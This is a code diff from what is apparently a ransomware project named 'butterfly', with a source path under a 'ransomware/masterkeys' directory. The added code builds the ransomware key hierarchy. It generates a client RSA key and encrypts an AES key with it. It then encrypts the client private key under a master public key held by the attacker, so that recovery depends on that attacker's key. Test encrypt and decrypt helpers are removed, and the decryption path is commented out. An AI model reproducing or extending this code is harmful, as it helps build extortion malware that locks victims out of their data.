@@ -6,48 +6,6 @@
 #include "crypto/rsaEncryptor.h"
 #include "crypto/rsaDecryptor.h"
 
-void encrypt() {
-
-    std::unique_ptr<butterfly::CryptoRSA> rsa(new butterfly::CryptoRSA());
-
-    const char *plaintext = "Test message abc, Test message def, Test message ghi";
-
-    EVP_PKEY *pkey = rsa->getPkeyFromPublicKeyFile("public.pem");
-
-    int keysize = EVP_PKEY_size(pkey);
-    LOG_TRACE("Keysize: " << keysize)
-
-    unsigned char ciphertext[keysize];
-
-    size_t ciphertext_len = rsa->encrypt(pkey, (unsigned char*)plaintext, strlen(plaintext)+1, ciphertext);
-    LOG_TRACE("ciphertext length: " << ciphertext_len)
-
-    FILE *out = fopen("file.bin","wb");
-    fwrite(ciphertext, sizeof(char), ciphertext_len, out);
-    //BIO_dump_fp (stdout, (const char *)ciphertext, (int)ciphertext_len);
-    LOG_TRACE("Ciphertext: " << reinterpret_cast<char*>(ciphertext));
-}
-
-void decrypt() {
-    std::unique_ptr<butterfly::CryptoRSA> rsa(new butterfly::CryptoRSA(2048));
-
-    EVP_PKEY *pkey = rsa->getPkeyFromPrivateKeyFile("CPrivateRSA.pem");
-
-    int keysize = EVP_PKEY_size(pkey);
-
-    unsigned char buffer[keysize];
-    unsigned char rsa_out[keysize] = {0};
-
-    FILE *out = fopen("key.bin", "rb");
-    fread(buffer, sizeof(buffer), 1, out);
-
-    LOG_TRACE("Keysize: " << keysize)
-
-    rsa->decrypt(pkey, buffer, (size_t)keysize, rsa_out);
-
-    LOG_TRACE("Decrypted: " << reinterpret_cast<char*>(rsa_out));
-}
-
 
 int main(int argc, char* argv[]) {
 
@@ -59,15 +17,29 @@ int main(int argc, char* argv[]) {
     //std::shared_ptr<butterfly::DirectoryIterator> dirIterator(new butterfly::DirectoryIterator());
 
 
-    std::unique_ptr<butterfly::RSAEncryptor> rsaEncryptor(new butterfly::RSAEncryptor("AESKey.bin", 2048));
+    std::unique_ptr<butterfly::RSAEncryptor> rsaEncryptor(new butterfly::RSAEncryptor(2048));
 
     rsaEncryptor->saveClientPrivateRSAKeyFile();
 
-    std::string aesKey = "0123456789abcdefghijkl";
+    // 1. encrypt aes key
+    std::string aesKey = "0123456789abcdefghijklabcd";
+    if ( rsaEncryptor->encrypt(rsaEncryptor->getEvpPkey(), aesKey) ) {
+        std::string aesKeyEnc = rsaEncryptor->getEncryptedKey();
+        rsaEncryptor->saveEncryptedKeyFile("AESKey.bin", aesKeyEnc, rsaEncryptor->getRSAKeySize());
+    }
 
-    rsaEncryptor->encrypt(aesKey);
+    std::string cPrivateRSA = rsaEncryptor->getRSAPrivateKeyStr();
 
-    sleep(5);
+    std::unique_ptr<butterfly::RSAEncryptor> rsaEncryptorFile(new butterfly::RSAEncryptor("/home/christian/projects/ransomware/masterkeys/SPublic.pem"));
+    EVP_PKEY *pkey1 = rsaEncryptorFile->getEvpPkey();
+
+    if ( rsaEncryptorFile->encrypt(pkey1, cPrivateRSA.substr(0, cPrivateRSA.size()-1)) ) {
+        std::string cPrivateRSAEnc = rsaEncryptorFile->getEncryptedKey();
+        rsaEncryptorFile->saveEncryptedKeyFile("CPrivateRSA.bin", cPrivateRSAEnc, rsaEncryptorFile->getEvpPkeySize(pkey1));
+    }
+
+    /*
+    sleep(2);
 
     std::unique_ptr<butterfly::RSADecryptor> rsaDecryptor(new butterfly::RSADecryptor());
 
@@ -76,7 +48,7 @@ int main(int argc, char* argv[]) {
 
     if (rsaDecryptor->decrypt(pkey, encKey) ) {
         LOG_TRACE(rsaDecryptor->getDecryptedKey())
-    }
+    }*/
 
 
     return 0;
